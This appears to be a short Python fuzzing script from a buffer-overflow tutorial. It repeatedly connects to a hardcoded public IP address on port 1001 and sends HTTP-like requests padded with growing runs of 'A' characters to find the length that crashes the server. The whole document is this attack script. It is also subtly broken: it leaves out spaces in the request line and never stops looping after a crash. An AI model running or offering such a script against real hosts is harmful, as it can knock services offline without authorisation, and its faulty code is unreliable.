# https://youtu.be/WIMerQ2zAvk source
# https://musyokaian.medium.com/buffer-overflow-101-356904169d94
# exploits the buffer overflow vulnerability of the server application
import socket
import time

server_ip = '104.131.79.111'
server_port = 1001
buffer_length = 50

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server_ip, server_port))
        junk = 'A' * buffer_length
        payload = 'GET' + junk + 'HTTP/1.1\r\n\r\n'
        s.send(payload.encode('raw_unicode_escape'))
        buffer_length += 50
        print(buffer_length)
        print('Payload sent successfully')
        s.close()
        time.sleep(1)
    except:
        print(f"Maybe overflow occured at {buffer_length}")
        time.sleep(1)
